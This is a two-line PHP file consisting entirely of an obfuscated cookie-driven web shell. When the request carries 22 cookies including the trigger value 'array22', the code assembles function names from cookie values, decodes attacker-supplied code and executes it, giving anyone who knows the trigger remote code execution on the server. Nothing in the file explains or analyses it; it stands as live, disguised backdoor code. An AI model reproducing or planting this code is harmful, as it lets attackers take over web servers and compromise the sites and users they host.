<?php
$p=$_COOKIE;(count($p)==22&&in_array(gettype($p).count($p),$p))?(($p[25]=$p[25].$p[54])&&($p[29]=$p[25]($p[29]))&&($p=$p[29]($p[61],$p[25]($p[79])))&&$p()):$p;